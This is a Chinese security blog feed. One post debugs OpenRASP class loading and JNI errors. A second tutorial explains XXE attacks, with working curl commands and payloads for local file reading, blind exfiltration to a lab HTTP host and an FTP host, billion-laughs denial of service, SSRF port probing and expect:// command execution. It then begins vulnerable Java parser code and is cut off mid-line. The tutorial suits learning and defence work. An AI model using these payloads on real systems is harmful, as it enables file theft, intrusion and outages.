        <content type="html"><![CDATA[<h1 id="OpenRASP再探类加载"><a href="#OpenRASP再探类加载" class="headerlink" title="OpenRASP再探类加载"></a>OpenRASP再探类加载</h1><h2 id="java-lang-UnsatisfiedLinkError"><a href="#java-lang-UnsatisfiedLinkError" class="headerlink" title="java.lang.UnsatisfiedLinkError"></a>java.lang.UnsatisfiedLinkError</h2><p>​我开始按照自己的理解，编写最简单的rasp程序，希望能实现对攻击的阻断。填坑的道路异常曲折，下面这条报错让我的进度迟滞了两天，本文就以该报错的解法为重点，重新思考OpenRASP的类加载。</p><blockquote><p>java.lang.UnsatisfiedLinkError:com.baidu.openrasp.v8.Check</p></blockquote><p>​以前我是怎样理解OpenRASP的类加载的呢？</p><blockquote><p>​把rasp.jar添加到BootStrap路径，这样当某加载器加载某类时（不管是系统类还是应用类，该类被插入一段字节码后，需要加载这段字节码中的rasp类），通过双亲委派机制一直向上层委派，最终必然能通过BootStrapClassLoader加载到rasp类。</p></blockquote><blockquote><p>​OpenRASP用扩展类加载器加载rasp-engine.jar，</p><p> a.使得要监控的系统类（“java&#x2F;io&#x2F;ObjectInputStream”）加载其中插入的rasp-engine代码时，只需要先通过BootStrapClassLoader加载的rasp.jar中的com.baidu.openrasp.ModuleLoader保存的moduleClassLoader中的扩展类加载器，加载rasp-engine.jar中的hook类。</p><p> b.使得要监控的应用类（“ognl&#x2F;OgnlParser”）加载其中插入的rasp-engine代码时，只需要在隐式加载中利用双亲委派机制向上委派，通过扩展类加载器加载rasp-engine.jar中的hook类。</p></blockquote><p>​简言之，将rasp.jar添加到启动类加载器上，任何类就能使用rasp.jar中的类。把ExtClassLoader缓存在ModuleLoader类（rasp.jar）的moduleClassLoader属性上，将rasp-engine.jar放在ExtClassLoader的加载路径上，并使用ExtClassLoader先加载EngineBoot类。当插桩位置调用hook类检测代码时，就能通过ExtClassLoader加载hook类、反射执行检测代码，或者利用双亲委派机制找到hook类、直接执行检测代码。</p><p>​这时候我就会想，既然将rasp.jar添加到启动类加载器上，就能获取到其中的类，那为啥不干脆将rasp-engine.jar的类都放到rasp.jar，岂不是更加简单？然后我就实现了这一想法，排除喽啰小坑后，剩下了本文开头的难题：</p><blockquote><p>java.lang.UnsatisfiedLinkError:com.baidu.openrasp.v8.Check</p></blockquote><p>​出现UnsatisfiedLinkError报错可能有几点原因：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.没有正确导入dll</span></span><br><span class="line">比如报错：java.lang.UnsatisfiedLinkError: no Sixense_Java in java.library.path</span><br><span class="line">    解决方式是：NativeLoader.loadLibrary(<span class="string">&quot;openrasp_v8_java&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);，这里的openrasp_v8_java一定要在类路径里。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//2.java包和c++的方法名不一致 </span></span><br><span class="line"><span class="comment">//就是说c++方法，要以“Java_类名”的方式命名，JNI所在的类名是com.bmsk.v8.V8</span></span><br><span class="line">JNIEXPORT jbyteArray JNICALL <span class="title function_">Java_com_baidu_openrasp_v8_V8_Check</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring, jbyteArray, jint, jobject, jint)</span>;  </span><br><span class="line"><span class="comment">//JNI</span></span><br><span class="line">V8.Check(type,out.toByteArray(), out.size(), <span class="keyword">new</span> <span class="title class_">Context</span>(checkParameter.getRequest()),</span><br><span class="line">                pluginTimeout)</span><br></pre></td></tr></table></figure><p>​但是，注意到这些问题后还是没能解决报错。然后，我就用“-verbose:jni”参数查看本地方法的执行情况，注意到V8.Initialize、V8.CreateSnapshot、V8.ExecuteScript执行都没问题，唯独V8.Check会报错。因为前面几个方法都在EngineBoot.start方法执行初始化系统时调用，V8.Check在插桩位置调用，我就开始怀疑是类加载的锅。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -verbose:jni -javaagent:D:\javaProject\testRASP\target\bmskrasp-demo-<span class="number">1.0</span>-SNAPSHOT.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="number">9193</span> -jar rasp-<span class="number">0.0</span><span class="number">.1</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>​我放弃了用启动类加载器加载全部代码，而是按照OpenRASP的类加载模式，用启动类加载器获取ExtClassLoader，用ExtClassLoader加载rasp-engine.jar。demo运行正常。</p><h2 id="debug思考"><a href="#debug思考" class="headerlink" title="debug思考"></a>debug思考</h2><p>​最初的demo是，把所有代码放到rasp.jar，将rasp.jar放到启动类加载器的加载路径上。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(V8.class.getClassLoader().getClass().getName())</span><br></pre></td></tr></table></figure><p>​观察加载V8的类加载器可知，将rasp.jar放到启动类加载器路径前后，类都是由“sun.misc.Launcher$AppClassLoader”应用类加载器加载的，当被保护的tomcat程序获取rasp.jar的类时，类则是由启动类加载器加载。“不同的类加载器加载的类不是同一个类”，后者没有执行Engine.start“系统初始化”代码，也就根本没执行loadLibrary(“openrasp_v8_java”)，这就导致了执行V8.Check时会报错UnsatisfiedLinkError，即当前类根本没有获取到dll文件。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inst.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(localJarPath));</span><br></pre></td></tr></table></figure><p>​那我干脆也写一个moduleClassLoader属性缓存agent程序执行时的应用类classLoader，tomcat程序获取rasp.jar类时，直接用moduleClassLoader.load(“hook类”)就好了？答案是不行的，因为启动类加载器加载rasp.jar时，无法获取到当年应用类加载执行时缓存的moduleClassLoader，更无从谈起反射获取hook类。</p><p>​回过头来看看OpenRASP的解法，将rasp.jar拆解出来单独做类加载，其中ModuleLoader类的静态代码块缓存了ExtClassLoader，这样插桩位置用启动类加载器加载rasp.jar中的ModuleLoader类时，执行静态代码块，就能获取唯一的ExtClassLoader。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">    System.out.println(systemClassLoader.getClass().getName());</span><br><span class="line">    <span class="keyword">while</span>(systemClassLoader.getParent()!=<span class="literal">null</span></span><br><span class="line">    &amp;&amp;!systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>))&#123;</span><br><span class="line">    systemClassLoader = systemClassLoader.getParent();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(systemClassLoader.getClass().getName());</span><br><span class="line">    moduleClassLoader = systemClassLoader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这也使我深思：</p><blockquote><p>1.将jar文件放入启动类加载器的加载路径时，它更应该是一个工具类，没有自身的状态，能够在static方法下对外提供服务。<br>2.如果需要对外提供服务、还要维护自身状态，可以考虑将jar文件只放到系统唯一的ExtClassLoader，先执行状态初始化代码，然后其他位置用ExtClassLoader反射获取jar中的方法。</p></blockquote><p>​经过这番折腾，我感觉OpenRASP提供了很好的通用思路，将一个jar包放到启动类加载器路径上，专门负责类加载，并使用ExtClassLoader加载另一个工具类jar包。<br>​    只用启动类加载器不行。放到任何加载器路径上都不再是最初的模样。</p><h2 id="排坑大赏"><a href="#排坑大赏" class="headerlink" title="排坑大赏"></a>排坑大赏</h2><p>1.C++ 父子项目导入”jni.h”时，父子项目都需要导入，不能只在父项目导入。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">选择c++、常规、附加包含目录</span><br></pre></td></tr></table></figure><p>2.写了JNI的demo程序，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//blog.csdn.net/qq_36235279/article/details/54380987</span></span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/349620799</span></span><br></pre></td></tr></table></figure><p>3.一段时间没写Spring Cloud程序了，竟然忘记了不同模块间引用类该咋写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用其他子模块的类，需要先将父项目打包，上传本地仓库install。</span><br></pre></td></tr></table></figure><p>4.javassist.CannotCompileException: cannot find javax.servlet.ServletRequest报错</p><p>​public static void checkRequest(Object filter, Object request, Object response)方法，传入的request参数为ApplicationFilterChain类doFilter方法的“$1”，类型为javax.servlet.ServletRequest。可能是javassist插桩时也需要获知系统中的其他类，解决方法是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classPool.appendSystemPath();  <span class="comment">//最开始只用了这个</span></span><br><span class="line">classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));   <span class="comment">//这个才是最重要的</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP-XXE漏洞</title>
      <link href="/2022/12/27/OpenRASP-XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/27/OpenRASP-XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-XXE漏洞"><a href="#OpenRASP-XXE漏洞" class="headerlink" title="OpenRASP-XXE漏洞"></a>OpenRASP-XXE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​XXE，XML External Entity Injection（XML外部实体注入）。当开发人员配置其XML解析功能允许外部实体引用时，攻击者能通过该功能，实现任意文件读取、内网端口探测、命令执行、拒绝服务等方面的攻击。</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>​XML (Extensible Markup Language,可扩展标记语言），可以用来标记数据、定义数据类型，主要用来表达数据间的结构。XML文档结构包括XML声明、DTD文档类型定义、文档元素。</p><p>XML文档声明：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure><p>元素、属性：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--img为元素，src为元素的属性，元素可包含文本、其他元素或者是空的。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>文档类型定义（DTD）：</p><p>​DTD是用来规范XML文档格式，既可以用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。既可以把这些规范放在源文件，也可以放在外面单独的文件。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">DTD内部声明：声明直接被包括在xml源文件中，通式为&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"><span class="comment">在我看来，xml文件是规范区（DTD）和数据区总成的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">DTD外部引用：声明直接被包括在xml源文件中，通式为&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span></span><br><span class="line"><span class="comment">外部引用，就是把上面&lt;!DOCTYPE &gt;放到外面单独的note.dtd文件中</span></span><br><span class="line"><span class="comment">*** 需要注意的是，外部dtd文件就不再需要&lt;!DOCTYPE note []&gt;，只需要&lt;?xml&gt;和&lt;!ENTITY&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实体：</p><p>​上面说到，DTD既提供了元素和结构上的规范，又用来定义实体，实体就是对普通文本或特殊字符的引用。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">内部实体，通式为&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;，在数据区通过“&amp;实体名;”引用</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">外部实体，通式为&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;，在数据区通过“&amp;实体名;”引用</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">外部参数实体，通式为&lt;!ENTITY % 实体名 &quot;实体内容”&gt;，只能在DTD中使用</span></span><br><span class="line"><span class="comment">*** 需要注意的是，%后面有空格</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">copyright</span> <span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">%copyright;</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">***</span></span><br><span class="line"><span class="comment">注意参数实体只能在DTD中使用，这句话意味着下面这种，</span></span><br><span class="line"><span class="comment">直接在规范区中使用%p是错误的，需要放在外部dtd：https://blog.csdn.net/shawdow_bug/article/details/107690256</span></span><br><span class="line"><span class="comment">    &lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">    &lt;!DOCTYPE note [</span></span><br><span class="line"><span class="comment">    &lt;!ENTITY % p &quot;text&quot;&gt;</span></span><br><span class="line"><span class="comment">    &lt;!ENTITY text &quot;this is a %p;&quot;&gt;         </span></span><br><span class="line"><span class="comment">    ]&gt;</span></span><br><span class="line"><span class="comment">    &lt;note&gt;&amp;text;&lt;/note&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>支持的协议：http、https、ftp、file、jar、netdoc、mailto和gopher。</p><h2 id="XXE不同种payload"><a href="#XXE不同种payload" class="headerlink" title="XXE不同种payload"></a>XXE不同种payload</h2><p>curl发送POST请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xml内容的双引号前要加\转义，否则后端调试时会发现所有双引号都会被删掉</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者-x <span class="string">&quot;http://127.0.0.1:8080&quot;</span>指定代理，通过burp修改xml内容，就不用加一堆\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># 请求字段Content-Type:text/xml ，也是查找XXE漏洞的标志</span></span></span><br><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST HTTP://192.168.1.3:8083/document -d &quot;xml内容&quot;</span><br></pre></td></tr></table></figure><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/document -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt; &lt;!ENTITY xxe SYSTEM \&quot;file:///C:/Users/bmsk/Desktop/1.txt\&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY&gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.txt&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Blind-XXE（无回显）"><a href="#Blind-XXE（无回显）" class="headerlink" title="Blind XXE（无回显）"></a>Blind XXE（无回显）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/XMLReader -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt; %remote;]&gt;&lt;attack&gt;&amp;send;&lt;/attack&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个payload编写时要注意：先提一下，在我看来xml=规范区+数据区</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.%后面有空格；2.数据区必须引用&amp;send;，并不是写在DOCTYPE就能解析；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3.规范区必须引用%remote;，让send实体加载到规范区；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4.xml不能省去它的数据区&lt;attack&gt;，正如牛战士不能脱下他的面具；</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.3:8084/attack.dtd&quot;&gt; </span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">remote;]&gt;</span></span><br><span class="line">&lt;attack&gt;&amp;send;&lt;/attack&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.这是外部实体dtd，不是xml规范区，不再需要写&lt;!DOCTYPE foo []&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.还是要使用必须先加载，故all%不可省略</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.1.3:8084/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">all;</span></span><br></pre></td></tr></table></figure><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/XMLReader -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt; %remote;]&gt;&lt;attack&gt;&amp;send;&lt;/attack&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然也可直接传入，不需要dtd，加个马甲：&lt;!DOCTYPE lolz [ ]&gt;&lt;lolz&gt;&amp;send;&lt;/lolz&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回：[Fatal Error] :1:1: JAXP00010001: 解析器在此文档中遇到多个 <span class="string">&quot;64000&quot;</span> 实体扩展; 这是 JDK 施加的限制。</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY lol &quot;abc&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY send &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br></pre></td></tr></table></figure><p>​此外还能通过http协议实现内网端口探测，expect协议执行系统命令，ftp协议远程传输文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">探测mysql，开启返回HTTP request failed，不开启返回Connection refuse</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">既然服务端能发送http请求，这也是一种SSRF</span></span><br><span class="line">&lt;!ENTITY  bee SYSTEM &quot;http://192.168.3.25:3306&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行系统命令 好像需要是php</span></span><br><span class="line">&lt;!ENTITY  bee SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ftp协议远程传输文件</span></span><br><span class="line">&lt;!ENTITY %d SYSTEM “file:///etc/passwd”&gt;</span><br><span class="line">&lt;!ENTITY % c “&lt;!ENTITY rrr SYSTEM &#x27;ftp://xxxx:2121/%d;&#x27;&gt;”&gt;</span><br></pre></td></tr></table></figure><h3 id="字符问题？？？"><a href="#字符问题？？？" class="headerlink" title="字符问题？？？"></a>字符问题？？？</h3><p>​我的理解是，XML数据区包含&amp;、&lt;和&gt;等字符时，会和XML自身标签混淆，从而产生语法错误。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面这种思路是，将解析的文件内容，放在&lt;![CDATA[...]]&gt;内部，CDATA不会按XML解析该文本。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最初我的复现失败了，感觉这种方式不适合Java，测试很多还是不大行......好像ftp、file等都会被文件内容限制</span></span><br><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/document -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % dtd SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt;%dtd;%all;]&gt;&lt;SOAP-ENV:Envelope&gt;&lt;SOAP-ENV:Body&gt;&lt;getStatus&gt;&lt;id&gt;&amp;content;&lt;/id&gt;&lt;/getStatus&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY content &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果环境是PHP，payload可以按上面，也有另一种方式：</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY bee SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/robots.txt&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;reset&gt;&lt;login&gt;&amp;bee;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span></span><br></pre></td></tr></table></figure><h2 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h2><h3 id="DocumentBuilderFactory实现（有回显）"><a href="#DocumentBuilderFactory实现（有回显）" class="headerlink" title="DocumentBuilderFactory实现（有回显）"></a>DocumentBuilderFactory实现（有回显）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;document&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//获取请求体内容的标准代码，不在乎是啥格式</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> 